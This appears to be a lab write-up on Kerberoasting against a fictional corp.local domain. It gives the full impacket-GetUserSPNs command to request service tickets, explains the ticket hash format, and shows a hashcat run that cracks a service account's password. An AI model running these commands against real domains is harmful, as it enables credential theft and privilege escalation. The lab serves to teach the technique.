# Lab 2: Practical Kerberoasting & Service Ticket Cracking

> **Objective**: Request a Kerberos TGS ticket for an SPN-registered service account and extract the crackable NTLM hash.

---

## 1. Discovering SPN Accounts & Requesting Tickets (GetUserSPNs)

```console
$ impacket-GetUserSPNs corp.local/jdoe:Welcome2024! -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName     Name          MemberOf                               PasswordLastSet             LastLogon
-----------------------  ------------  -------------------------------------  --------------------------  --------------------------
MSSQLSvc/sql.corp.local  svc_sqladmin  CN=Server Operators,CN=Builtin,DC=corp  2026-03-15 10:22:18.128452  2026-11-20 08:14:02.948211
HTTP/web.corp.local      svc_web       CN=Domain Users,CN=Users,DC=corp       2026-05-10 14:02:11.821451  2026-11-19 19:45:10.002941

[*] Querying domain for SPNs...
[*] Found 2 SPNs
[*] Requesting TGS for: MSSQLSvc/sql.corp.local
[*] Requesting TGS for: HTTP/web.corp.local
[*] Saving hashes to kerberoast_hashes.txt
```

---

## 2. Inspecting the Kerberos Ticket Structure

```console
$ head -n 1 kerberoast_hashes.txt

$krb5tgs$23$*svc_sqladmin$corp.local$MSSQLSvc/sql.corp.local*$A1B2C3D4E5...$10A2B3C4...
```
* `$krb5tgs$`: Hash format prefix.
* `$23$`: Kerberos encryption type (`0x17` = RC4-HMAC-MD5).
* `svc_sqladmin`: Target service account.

---

## 3. Cracking Kerberos TGS Tickets with Hashcat

```console
$ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc_sqladmin$corp.local...:DatabaseAdmin2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Speed.#1.........: 4,120.5 kH/s
Recovered........: 1/2 (50.00%) Digests
```
